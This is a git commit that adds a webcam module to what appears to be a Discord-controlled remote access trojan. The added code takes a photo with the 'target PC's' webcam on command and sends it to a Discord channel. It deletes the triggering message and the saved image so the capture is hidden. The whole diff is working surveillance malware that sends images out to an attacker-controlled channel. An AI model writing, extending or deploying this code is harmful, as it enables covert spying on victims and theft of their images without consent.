a47a6d8f135a72f9cea6c53ddf86a6675d7820f8
JuicyChann <nik.xeiladakis@gmail.com>
2023-11-21 19:04:03 +0200

    add webcam with new argument

---
+++ resources/features/webcam.py
@@ -0,0 +1,30 @@
+import pygame.camera
+import pygame.image
+import subprocess
+import time
+
+@client.command(name="webcam")
+async def webcam(ctx, action=None, camera_index=None):
+    await ctx.message.delete()
+    if action == "photo":
+        pygame.camera.init()
+        cameras = pygame.camera.list_cameras()
+        if not cameras:
+            return await ctx.send('No cameras found.')
+        if camera_index != None:
+            camera_index = int(camera_index)
+        else: camera_index = 0
+        try:
+            camera = pygame.camera.Camera(cameras[camera_index])
+            camera.start()
+        except IndexError:
+            return await ctx.send('Camera with index ' + str(camera_index) + ' was not found.')
+        time.sleep(1)
+        image = camera.get_image()
+        camera.stop()
+        pygame.image.save(image, 'webcam.png')
+        await ctx.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File('webcam.png'))
+        subprocess.run('del /s webcam.png', shell=True)
+    else:
+        await ctx.send('```Syntax: .webcam <action> <camera_index (default: 0)>\nActions:\n    photo - take a photo with target PC\'s webcam```')
+
